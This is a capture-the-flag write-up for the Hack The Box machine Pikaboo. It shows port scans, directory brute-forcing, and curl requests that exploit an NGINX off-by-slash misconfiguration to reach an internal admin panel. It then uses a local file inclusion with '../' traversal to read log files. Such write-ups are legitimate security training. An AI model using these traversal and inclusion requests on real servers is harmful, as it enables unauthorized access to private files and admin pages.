@@ -1,0 +1,929 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Pikaboo</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#htb-pikaboo">htb-pikaboo</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#debian">debian</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#off-by-slash">off-by-slash</a> <a class="post-tag" href="/tags#lfi">lfi</a> <a class="post-tag" href="/tags#log-poisoning">log-poisoning</a> <a class="post-tag" href="/tags#perl-diamond-injection">perl-diamond-injection</a> <a class="post-tag" href="/tags#perl">perl</a> <a class="post-tag" href="/tags#open-injection">open-injection</a> <a class="post-tag" href="/tags#open-injection-perl">open-injection-perl</a> <a class="post-tag" href="/tags#ldap">ldap</a> <a class="post-tag" href="/tags#ldapsearch">ldapsearch</a> <a class="post-tag" href="/tags#htb-seal">htb-seal</a> <a class="post-tag" href="/tags#breaking-parser-logic">breaking-parser-logic</a> <a class="post-tag" href="/tags#oscp-plus-v2">oscp-plus-v2</a> </span><br/><br/>
+<time class="dt-published" datetime="2021-12-04T14:45:00+00:00" itemprop="datePublished">Dec 4, 2021
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2021/12/04/htb-pikaboo.html" style="color: #e6e6e6; text-decoration: none;">HTB: Pikaboo</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/pikaboo-cover.webp" type="image/webp"/>
+<img alt="Pikaboo" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/pikaboo-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:120px;">
+</img></picture>
+<p>Pikaboo required a lot of enumeration and putting together different pieces to get through each step. I’ll only ever get a shell as www-data and root, but for each step there’s several pieces to pull together and combine to some effect. I’ll start by abusing an off-by-slash vulnerability in the interaction between NGINX and Apache to get access to a staging server. In there, I’ll use an LFI to include FTP logs, which I can poison with PHP to get execution. As www-data, I’ll find a cron running a Perl script as root, which is vulnerable to command injection via the diamond operator. I’ll find creds for another user in LDAP and get access to FTP, where I can drop a file that will be read and give execution to get a shell as root.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/360 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/pikaboo" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Pikaboo</a> <a href="https://hackthebox.com/machines/pikaboo" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-pikaboo.webp" type="image/webp"/> <img alt="Pikaboo" class="img-av" src="/icons/box-pikaboo.png"/></picture></a><br/><a href="https://hackthebox.com/machines/pikaboo" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1415671577748799584">17 Jul 2021</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">04 Dec 2021</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Hard">Hard [40]</span></td>
+</tr>
+<tr>
+<td>Rated Difficulty</td>
+<td style="text-align: right"><picture><source srcset="/img/pikaboo-diff.webp" type="image/webp"/><img alt="Rated difficulty for Pikaboo" src="/img/pikaboo-diff.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td>Radar Graph</td>
+<td style="text-align: right"><picture><source srcset="/img/pikaboo-radar.webp" type="image/webp"/><img alt="Radar chart for Pikaboo" src="/img/pikaboo-radar.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">01:40:48</span><a href="https://app.hackthebox.com/users/77141" rel="noopener" target="_blank"><img alt="jkr" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/77141" style="display: unset"/><span class="user-text" style="display: none"> jkr</span></a><br/></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">03:00:15</span><a href="https://app.hackthebox.com/users/9267" rel="noopener" target="_blank"><img alt="snowscan" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/9267" style="display: unset"/><span class="user-text" style="display: none"> snowscan</span></a><br/></td>
+</tr>
+<tr>
+<td>Creators</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/157669" rel="noopener" target="_blank"><img alt="pwnmeow" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/157669" style="display: unset"/><span class="user-text" style="display: none"> pwnmeow</span></a><br/> <a href="https://app.hackthebox.com/users/159204" rel="noopener" target="_blank"><img alt="polarbearer" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/159204" style="display: unset"/><span class="user-text" style="display: none"> polarbearer</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> found three open TCP ports, FTP (21), SSH (22), and HTTP (80):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp 10.10.10.249
+<span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-17 15:10 EDT
+Nmap scan report for 10.10.10.249
+Host is up (0.095s latency).
+Not shown: 65532 closed ports
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 171.09 seconds
+
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>nmap <span class="nt">-p</span> 21,22,80 <span class="nt">-sCV</span> <span class="nt">-oA</span> scans/nmap-tcpscripts 10.10.10.249
+<span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-17 15:13 EDT
+Nmap scan report for 10.10.10.249
+Host is up (0.024s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 17:e1:13:fe:66:6d:26:b6:90:68:d0:30:54:2e:e2:9f (RSA)
+|   256 92:86:54:f7:cc:5a:1a:15:fe:c6:09:cc:e5:7c:0d:c3 (ECDSA)
+|_  256 f4:cd:6f:3b:19:9c:cf:33:c6:6d:a5:13:6a:61:01:42 (ED25519)
+80/tcp open  http    nginx 1.14.2
+|_http-server-header: nginx/1.14.2
+|_http-title: Pikaboo
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.15 seconds
+</span></code></pre></div></div>
+<p>Based on the <a href="https://packages.debian.org/search?keywords=openssh-server">OpenSSH</a> version, the host is likely running Debian 10 Buster.</p>
+<h3 id="ftp---tcp-21">FTP - TCP 21</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> would usually flag if anonymous access was allowed, but I’ll confirm manually:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>ftp 10.10.10.249
+<span class="go">Connected to 10.10.10.249.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.249:oxdf): anonymous
+331 Please specify the password.
+Password:
+530 Login incorrect.
+Login failed.
+</span></code></pre></div></div>
+<p>I’ll come back if I find creds.</p>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>The site is a “Pokatmon” collectors site (clearly a Pokemon imitator):</p>
+<div style="max-height: 500px; overflow: hidden; position: relative; margin-bottom: 20px;">
+<a href="https://0xdfimages.gitlab.io/img/image-20210707114334439.png">
+<img alt="image-20210707114334439" src="https://0xdfimages.gitlab.io/img/image-20210707114334439.png" style="clip-path: polygon(0 0, 100% 0, 100% 460px, 49% 490px, 51% 470px, 0 500px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 460px, 49% 490px, 51% 470px, 0 500px)"/>
+</a>
+<div style="position: absolute; right: 20px; top: 475px"><a href="https://0xdfimages.gitlab.io/img/image-20210707114334439.png"><i>Click for full image</i></a></div>
+</div>
+<p>There are three links on the page. Pokatdex (<code class="language-plaintext highlighter-rouge">/pokatdex.php</code>) gives a bunch of monster images and stats:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210707115043587.webp" type="image/webp"/>
+<img alt="image-20210707115043587" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210707115043587.png"/>
+</picture>
+<p>Clicking on any of the monsters loads a page that says PokeAPI Integration is coming soon:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210707115136899.webp" type="image/webp"/>
+<img alt="image-20210707115136899" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210707115136899.png"/>
+</picture>
+<p><a href="https://pokeapi.co/">PokeAPI</a> is a RESTful API for querying details about Pokemon characters / cards.</p>
+<p>The contact link (<code class="language-plaintext highlighter-rouge">contact.php</code>) presents a form:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210707115206079.webp" type="image/webp"/>
+<img alt="image-20210707115206079" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210707115206079.png"/>
+</picture>
+<p>The button on this page doesn’t seem to actually submit any requests.</p>
+<p>The admin link (<code class="language-plaintext highlighter-rouge">/admin</code>) pops HTTP auth:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210707115345210.webp" type="image/webp"/>
+<img alt="image-20210707115345210" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210707115345210.png"/>
+</picture>
+<p>Nothing I guessed allowed access, and on hitting Cancel, there’s an Unauthorized page:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210707115430373.webp" type="image/webp"/>
+<img alt="image-20210707115430373" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210707115430373.png"/>
+</picture>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>From the links above it’s clear this site is running on PHP. Visiting <code class="language-plaintext highlighter-rouge">/index.php</code> confirms that as well, as the same page as <code class="language-plaintext highlighter-rouge">/</code> is displayed.</p>
+<p>The HTTP response headers show nothing too useful beyond the nginx version:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.14.2</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Sat, 17 Jul 2021 19:08:15 GMT</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">6922</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
+</code></pre></div></div>
+<p>It’s interesting to note that the Unauthorized page above shows Apache running on 127.0.0.1:81, so it seems likely that NGINX is reverse-proxying the requests to Apache.</p>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site, and include <code class="language-plaintext highlighter-rouge">-x php</code> since I know the site is PHP:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.10.10.249 <span class="nt">-x</span> php
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.2.1
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.10.249
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.2.1
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml   
+ 💲  Extensions            │ [php]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Cancel Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-red">401</span><span class="go">       14l       54w      456c http://10.10.10.249/adminnew
+</span><span class="feroxbuster-red">401</span><span class="go">       14l       54w      456c http://10.10.10.249/adminnew.php                
+</span><span class="feroxbuster-red">401</span><span class="go">       14l       54w      456c http://10.10.10.249/admin_area         
+</span><span class="feroxbuster-red">401</span><span class="go">       14l       54w      456c http://10.10.10.249/admin_area.php
+</span><span class="feroxbuster-red">401</span><span class="go">       14l       54w      456c http://10.10.10.249/admin_online
+</span><span class="feroxbuster-red">401</span><span class="go">       14l       54w      456c http://10.10.10.249/admin_online.php
+</span><span class="feroxbuster-red">401</span><span class="go">       14l       54w      456c http://10.10.10.249/administracja
+</span><span class="feroxbuster-red">401</span><span class="go">       14l       54w      456c http://10.10.10.249/administracja.php
+</span><span class="feroxbuster-red">401</span><span class="go">       14l       54w      456c http://10.10.10.249/admin_news
+</span><span class="feroxbuster-red">401</span><span class="go">       14l       54w      456c http://10.10.10.249/admin_news.php
+</span><span class="feroxbuster-red">401</span><span class="go">       14l       54w      456c http://10.10.10.249/admin
+</span><span class="feroxbuster-red">401</span><span class="go">       14l       54w      456c http://10.10.10.249/admin_images
+</span><span class="feroxbuster-red">403</span><span class="go">        9l       28w      274c http://10.10.10.249/admin.php
+</span><span class="feroxbuster-red">401</span><span class="go">       14l       54w      456c http://10.10.10.249/admin_images.php
+🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_10_10_249-1625673358.state ...   
+[</span><span class="feroxbuster-yellow">###</span><span class="go">&gt;----------------] - 20s    10676/59998   1m      </span><span class="feroxbuster-green">found</span><span class="go">:37      </span><span class="feroxbuster-red">errors</span><span class="go">:0      
+[</span><span class="feroxbuster-cyan">###</span><span class="go">&gt;----------------] - 20s    10650/59998   507/s   http://10.10.10.249
+</span></code></pre></div></div>
+<p>I had to kill this mid-run, as it seems that any path starting with <code class="language-plaintext highlighter-rouge">/admin</code> seems to be returning this 401 Unauthorized, except for <code class="language-plaintext highlighter-rouge">admin.php</code>, which is returning 403 Forbidden:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-I</span> http://10.10.10.249/admincms.php
+<span class="go">HTTP/1.1 401 Unauthorized
+Server: nginx/1.14.2
+Date: Wed, 07 Jul 2021 16:02:50 GMT
+Content-Type: text/html; charset=iso-8859-1
+Connection: keep-alive
+WWW-Authenticate: Basic realm="Authentication Required"
+
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-I</span> http://10.10.10.249/admin.php
+<span class="go">HTTP/1.1 403 Forbidden
+Server: nginx/1.14.2
+Date: Wed, 07 Jul 2021 16:02:55 GMT
+Content-Type: text/html; charset=iso-8859-1
+Connection: keep-alive
+Vary: Accept-Encoding
+</span></code></pre></div></div>
+<p>I’ll re-run <code class="language-plaintext highlighter-rouge">feroxbuster</code> filtering out 401 responses with <code class="language-plaintext highlighter-rouge">-C 401</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.10.10.249 <span class="nt">-x</span> php <span class="nt">-C</span> 401
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.2.1
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.10.249
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
+ 💢  Status Code Filters   │ [401]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.2.1
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 💲  Extensions            │ [php]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Cancel Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-yellow">301</span><span class="go">        9l       28w      319c http://10.10.10.249/images
+</span><span class="feroxbuster-green">200</span><span class="go">       92l      213w     3180c http://10.10.10.249/contact.php
+</span><span class="feroxbuster-green">200</span><span class="go">      208l      477w     6922c http://10.10.10.249/index.php
+</span><span class="feroxbuster-red">403</span><span class="go">        9l       28w      274c http://10.10.10.249/admin.php
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 2m    119996/119996  0s      </span><span class="feroxbuster-green">found</span><span class="go">:4       </span><span class="feroxbuster-red">errors</span><span class="go">:0      
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     59998/59998   511/s   http://10.10.10.249
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     59998/59998   512/s   http://10.10.10.249/images
+</span></code></pre></div></div>
+<p>Nothing new here beyond what I already found.</p>
+<h2 id="shell-as-www-data">Shell as www-data</h2>
+<h3 id="access-admin-panel">Access Admin Panel</h3>
+<h4 id="off-by-slash">Off By Slash</h4>
+<p>Orange Tsai has a <a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf">great presentation on web server misconfigurations</a>, and the Off By Slash section starts at slide 17. This presentation is the same one I referenced in solving <a href="/2021/11/13/htb-seal.html#access-tomcat-manager">Seal</a>, but a different technique/use-case. I’ll show an example from <a href="https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/">this post</a>. The idea is that if NGINX has a config that looks like this:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>location /i {
+    alias /data/w3/images/;
+}
+</code></pre></div></div>
+<p>When someone visits <code class="language-plaintext highlighter-rouge">/i../app/config.py</code>, NGINX will rewrite that to <code class="language-plaintext highlighter-rouge">/data/w3/images/../app/config.py</code>, thus providing directory traversal.</p>
+<p>In this example, I know there’s some kind of rule that’s re-writing <code class="language-plaintext highlighter-rouge">/admin</code>, and i know there’s no trailing slash or else something like <code class="language-plaintext highlighter-rouge">/adminnew</code> wouldn’t be re-written. So I can guess that the config looks something like:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>location /admin {
+    proxy_pass http://localhost:[port apache is listening on]/[more path?]/
+}
+</code></pre></div></div>
+<p>My request to <code class="language-plaintext highlighter-rouge">/admin.php</code> would then end up at <code class="language-plaintext highlighter-rouge">http://localhost:[port]/[path]/.php</code>, which explains why it’s behaving differently from the other proxied stuff.</p>
+<p>To test this, I can look up a directory and see if there’s an <code class="language-plaintext highlighter-rouge">index.php</code> or <code class="language-plaintext highlighter-rouge">index.html</code>, but no luck:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-I</span> http://10.10.10.249/admin../index.php
+<span class="go">HTTP/1.1 404 Not Found
+Server: nginx/1.14.2
+Date: Sat, 17 Jul 2021 19:19:51 GMT
+Content-Type: text/html; charset=iso-8859-1
+Connection: keep-alive
+Vary: Accept-Encoding
+
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-I</span> http://10.10.10.249/admin../index.html
+<span class="go">HTTP/1.1 404 Not Found
+Server: nginx/1.14.2
+Date: Sat, 17 Jul 2021 19:19:58 GMT
+Content-Type: text/html; charset=iso-8859-1
+Connection: keep-alive
+Vary: Accept-Encoding
+</span></code></pre></div></div>
+<p>Tricks to get back to <code class="language-plaintext highlighter-rouge">/admin</code> don’t help anything:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-I</span> http://10.10.10.249/admin../admin
+<span class="go">HTTP/1.1 401 Unauthorized
+Server: nginx/1.14.2
+Date: Sat, 17 Jul 2021 19:20:17 GMT
+Content-Type: text/html; charset=iso-8859-1
+Connection: keep-alive
+WWW-Authenticate: Basic realm="Authentication Required"
+</span></code></pre></div></div>
+<p>I took a guess that perhaps I could access the pokatdex part of the site, if it were being served out of a folder named <code class="language-plaintext highlighter-rouge">pokatdex</code> in the same folder as the admin page, and it worked:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-I</span> http://10.10.10.249/admin../pokatdex/
+<span class="go">HTTP/1.1 200 OK
+Server: nginx/1.14.2
+Date: Sat, 17 Jul 2021 19:20:27 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: keep-alive
+Vary: Accept-Encoding
+
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-I</span> http://10.10.10.249/admin../pokatdex/contact.php
+<span class="go">HTTP/1.1 200 OK
+Server: nginx/1.14.2
+Date: Sat, 17 Jul 2021 19:20:32 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: keep-alive
+Vary: Accept-Encoding
+</span></code></pre></div></div>
+<p>Still, while that verifies I’m thinking about the configuration right, there’s not much I can do with that.</p>
+<p>Thinking about what else might be being served by Apache, I tried looking for <code class="language-plaintext highlighter-rouge">server-status</code>. This is typically only accessible from localhost, but given the NGINX proxy, the request will be coming from localhost. Trying to hit the page directly doesn’t work (it would have been found by <code class="language-plaintext highlighter-rouge">feroxbuster</code>):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-I</span> http://10.10.10.249/server-status
+<span class="go">HTTP/1.1 404 Not Found
+Server: nginx/1.14.2
+Date: Tue, 30 Nov 2021 22:22:40 GMT
+Content-Type: text/html; charset=iso-8859-1
+Connection: keep-alive
+Vary: Accept-Encoding
+</span></code></pre></div></div>
+<p>If I try to request the page with a <code class="language-plaintext highlighter-rouge">/../</code>, it doesn’t work:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-I</span> http://10.10.10.249/admin/../server-status
+<span class="go">HTTP/1.1 404 Not Found
+Server: nginx/1.14.2
+Date: Sat, 17 Jul 2021 19:21:02 GMT
+Content-Type: text/html; charset=iso-8859-1
+Connection: keep-alive
+Vary: Accept-Encoding
+</span></code></pre></div></div>
+<p>But using the off by slash, it does:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-I</span> http://10.10.10.249/admin../server-status
+<span class="go">HTTP/1.1 200 OK
+Server: nginx/1.14.2
+Date: Sat, 17 Jul 2021 19:21:18 GMT
+Content-Type: text/html; charset=ISO-8859-1
+Content-Length: 6242
+Connection: keep-alive
+Vary: Accept-Encoding
+Vary: Accept-Encoding
+</span></code></pre></div></div>
+<p>In Firefox:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210707131731884.webp" type="image/webp"/>
+<img alt="image-20210707131731884" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210707131731884.png"/>
+</picture>
+<p>In addition to seeing the urls I’ve been visiting, there’s also one at the top that is interesting, <code class="language-plaintext highlighter-rouge">/admin_staging</code>. This page also shows that Apache is listening on TCP 81 on localhost.</p>
+<h4 id="admin-staging">Admin Staging</h4>
+<p>Visiting <code class="language-plaintext highlighter-rouge">10.10.10.249/admin../admin_staging</code> actually returned a HTTP redirect to <code class="language-plaintext highlighter-rouge">http://127.0.0.1:81/admin_staging/</code>, which then fails because I can’t connect to localhost:81. It took me a minute to figure out what was going on here. The request is passed by NGINX to <code class="language-plaintext highlighter-rouge">http://127.0.0.1:81/admin/../admin_staging</code>. But because this is a directory, it returns a 301 to the url with a <code class="language-plaintext highlighter-rouge">/</code> on the end (and normalizes it to <code class="language-plaintext highlighter-rouge">/admin_staging</code> in the process).</p>
+<p>Visiting <code class="language-plaintext highlighter-rouge">http://10.10.10.249/admin../admin_staging/</code> returns a new dashboard:</p>
+<div style="max-height: 300px; overflow: hidden; position: relative; margin-bottom: 20px;">
+<a href="https://0xdfimages.gitlab.io/img/image-20210707132900010.png">
+<img alt="image-20210707132900010" src="https://0xdfimages.gitlab.io/img/image-20210707132900010.png" style="clip-path: polygon(0 0, 100% 0, 100% 260px, 49% 290px, 51% 270px, 0 300px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 260px, 49% 290px, 51% 270px, 0 300px)"/>
+</a>
+<div style="position: absolute; right: 20px; top: 275px"><a href="https://0xdfimages.gitlab.io/img/image-20210707132900010.png"><i>Click for full image</i></a></div>
+</div>
+<p>The different links on the side lead to information that doesn’t seem useful. But the URL structure is interesting. For example, User Profile leads to <code class="language-plaintext highlighter-rouge">http://10.10.10.249/admin../admin_staging/index.php?page=user.php</code>.</p>
+<h3 id="lfi">LFI</h3>
+<p>This is not an uncommon pattern in PHP pages, and suggests a potential file inclusion. And, because the page parameter includes <code class="language-plaintext highlighter-rouge">.php</code> on the end, it is likely I can read files that are not just PHP files. A more secure way to do this would be to have <code class="language-plaintext highlighter-rouge">page=user</code> and then append <code class="language-plaintext highlighter-rouge">.php</code> to the input in the PHP before including it.</p>
+<p>Unfortunately, I can’t seem to read <code class="language-plaintext highlighter-rouge">/etc/passwd</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210707133915976.webp" type="image/webp"/>
+<img alt="image-20210707133915976" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210707133915976.png"/>
+</picture>
+<p>Before giving up, I checked something more local, and it worked:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210707134119419.webp" type="image/webp"/>
+<img alt="image-20210707134119419" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210707134119419.png"/>
+</picture>
+<p>I included the contact page and it is displayed in that space.</p>
+<p>It seems like I can read within the current directory, and up one level, but not all the way to root.</p>
+<p>It’s fair to guess that the sites are running out folders in <code class="language-plaintext highlighter-rouge">/var/www</code> or maybe  <code class="language-plaintext highlighter-rouge">/var/www/html</code>. If that’s the case, I can’t think of any default folders I can check in <code class="language-plaintext highlighter-rouge">/var/www</code>, but I can try to access things in <code class="language-plaintext highlighter-rouge">/var/</code>. On my own host, I’ll run <code class="language-plaintext highlighter-rouge">find /var/ -type f -perm -o=r 2&gt;/dev/null</code> to look for world readable files in <code class="language-plaintext highlighter-rouge">/var</code>. There are a ton, and I’ll look through them to find ones that might be on PikaBoo as well. I tried <code class="language-plaintext highlighter-rouge">/var/log/dpkg.log</code>. It didn’t show up at <code class="language-plaintext highlighter-rouge">page=../../log/dpkg.log</code>, but at <code class="language-plaintext highlighter-rouge">page=../../../log/dpkg.log</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210707134842647.webp" type="image/webp"/>
+<img alt="image-20210707134842647" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210707134842647.png"/>
+</picture>
+<p>Interestingly, that access was taken right after release. In checking the box for this post just before it retires, <code class="language-plaintext highlighter-rouge">dpkg.log</code> is still there, but it’s 0 bytes (due to rotation of logs). Still, <code class="language-plaintext highlighter-rouge">dpkg.log.1</code> is there with the same contents.</p>
